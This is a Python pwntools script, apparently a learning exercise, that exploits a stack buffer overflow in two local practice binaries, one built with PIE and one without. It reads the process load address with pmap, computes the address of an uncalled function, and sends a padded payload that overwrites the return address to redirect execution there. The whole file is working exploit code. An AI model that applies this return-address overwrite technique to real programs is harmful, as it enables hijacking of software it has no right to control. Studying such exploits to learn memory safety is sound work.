from pwn import *
from subprocess import Popen, PIPE, STDOUT
import subprocess
import re

#print('hello there! general ken' + '\xFB\x51\x55\x55\x55\x55\x00\x00')
payload = b'hello there! general ken'
#payload += p64(0x00005555555551fb, endian='little')

p = Popen('/home/msprest/Desktop/StackSmash/newExample2',stdout=PIPE,stderr=PIPE,stdin=PIPE)
print("Vulnerable function ran...")

#get the inital load addr
initial_load_addr_run = subprocess.check_output('pmap $(pidof newExample2)', shell=True)
print("Trying to find address space.")
#print(initial_load_addr_run)
load_addr = re.findall("([0-9a-f]{16}).*?r--.*?newExample2", initial_load_addr_run.decode())[0]

print("The program is starting loading at: %s\n\n"% load_addr)

#convert that string into a hex number:
load_addr = int(load_addr,16)
#load_addr = hex(load_addr)
#print(hex(load_addr))

#offset of uncalled = 0x1011fb
load_addr += 0x11fb
payload += p64(load_addr, endian='little')
#payload = payload[:-2] #illustrates how we got lucky
#payload += b'\0\n'
print(payload)

#payload = b'a'*15
flag_attempt = p.communicate(input=payload)
print(flag_attempt[0].decode())
print("Error: ", flag_attempt[1])

#0x004011e8 <-- jump point
########################################################################
#
# NO PIE
#
#########################################################################
p = Popen('/home/msprest/Desktop/StackSmash/newExample2nopie',stdout=PIPE,stderr=PIPE,stdin=PIPE)
print("Next vulnerable function ran...\n")
new_payload = b'hello there! general ken'
new_payload += p64(0x004011e8, endian='little')
print("Sending payload...\n")
flag_attempt = p.communicate(input=new_payload)
print(flag_attempt[0].decode())
print("Error: ", flag_attempt[1])